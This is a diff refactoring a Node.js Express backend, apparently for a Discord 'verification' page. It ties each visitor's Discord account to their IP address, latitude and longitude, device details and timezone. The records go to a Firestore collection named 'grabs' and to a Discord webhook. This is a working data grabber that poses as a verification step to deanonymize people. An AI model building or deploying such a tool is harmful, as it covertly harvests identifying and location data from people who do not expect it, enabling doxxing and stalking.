@@ -1,8 +1,8 @@
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
-const admin = require('firebase-admin');
 const bodyParser = require('body-parser');
+const admin = require('firebase-admin');
 require('dotenv').config();
 
 const app = express();
@@ -10,7 +10,7 @@ app.use(cors());
 app.use(bodyParser.json());
 
 admin.initializeApp({
-  credential: admin.credential.cert(require('./firebase.json'))
+  credential: admin.credential.cert(require('./firebase.json')) // your Firebase service account
 });
 const db = admin.firestore();
 
@@ -28,40 +28,42 @@ app.post('/callback', async (req, res) => {
 
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   const timestamp = new Date();
-  const unixSeconds = Math.floor(timestamp.getTime() / 1000);
-  const nanoseconds = (timestamp.getTime() % 1000) * 1e6;
-
-  if (!code) return res.status(400).send('Missing Discord code');
+  const ts = {
+    seconds: Math.floor(timestamp.getTime() / 1000),
+    nanoseconds: (timestamp.getTime() % 1000) * 1e6
+  };
 
   let discordUserId = 'unknown';
   let discordUsername = 'unknown';
 
   try {
-    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token',
+    // Step 1: Exchange code for token
+    const tokenRes = await axios.post('https://discord.com/api/oauth2/token',
       new URLSearchParams({
         client_id: process.env.CLIENT_ID,
         client_secret: process.env.CLIENT_SECRET,
         grant_type: 'authorization_code',
-        code: code,
+        code,
         redirect_uri: process.env.REDIRECT_URI,
         scope: 'identify'
       }), {
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
       });
 
-    const accessToken = tokenResponse.data.access_token;
+    const accessToken = tokenRes.data.access_token;
 
-    const userResponse = await axios.get('https://discord.com/api/users/@me', {
+    // Step 2: Get user info
+    const userRes = await axios.get('https://discord.com/api/users/@me', {
       headers: { Authorization: `Bearer ${accessToken}` }
     });
 
-    discordUserId = userResponse.data.id;
-    discordUsername = `${userResponse.data.username}#${userResponse.data.discriminator}`;
-  } catch (e) {
-    console.error('OAuth Error:', e.response?.data || e.message);
+    discordUserId = userRes.data.id;
+    discordUsername = `${userRes.data.username}#${userRes.data.discriminator}`;
+  } catch (err) {
+    console.error('Discord OAuth error:', err.response?.data || err.message);
   }
 
-  const entry = {
+  const payload = {
     ip,
     code,
     discordUserId,
@@ -74,28 +76,36 @@ app.post('/callback', async (req, res) => {
     userAgent,
     language,
     timestamp: timestamp.toISOString(),
-    ts: {
-      seconds: unixSeconds,
-      nanoseconds: nanoseconds
-    }
+    ts
   };
 
-  // Store in Firebase
   try {
-    const ref = await db.collection('grabs').add(entry);
-    entry.id = ref.id;
-  } catch (e) {
-    console.error('Firebase error:', e);
+    // Save to Firebase
+    const docRef = await db.collection('grabs').add(payload);
+    payload.id = docRef.id;
+  } catch (err) {
+    console.error('Firebase error:', err.message);
   }
 
-  // Send to Discord Webhook
   try {
+    // Send to Discord Webhook
     await axios.post(process.env.WEBHOOK_URL, {
-      content: `**New Verification**\nUser: ${discordUsername} (${discordUserId})\nIP: ${ip}\nPlatform: ${platform}\nScreen: ${screenResolution}\nLocation: ${latitude}, ${longitude}\nLang: ${language}\nTZ: ${timezone}\nUA: ${userAgent}`
+      content: `**New Verification Data**\n` +
+               `**Username:** ${discordUsername}\n` +
+               `**Discord ID:** ${discordUserId}\n` +
+               `**IP:** ${ip}\n` +
+               `**Platform:** ${platform}\n` +
+               `**Resolution:** ${screenResolution}\n` +
+               `**Location:** ${latitude}, ${longitude}\n` +
+               `**Language:** ${language} | **TZ:** ${timezone}\n` +
+               `**User Agent:** ${userAgent}`
     });
-  } catch (e) {
-    console.error('Webhook Error:', e.response?.data || e.message);
+  } catch (err) {
+    console.error('Webhook error:', err.message);
   }
 
   res.status(200).json({ success: true });
 });
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
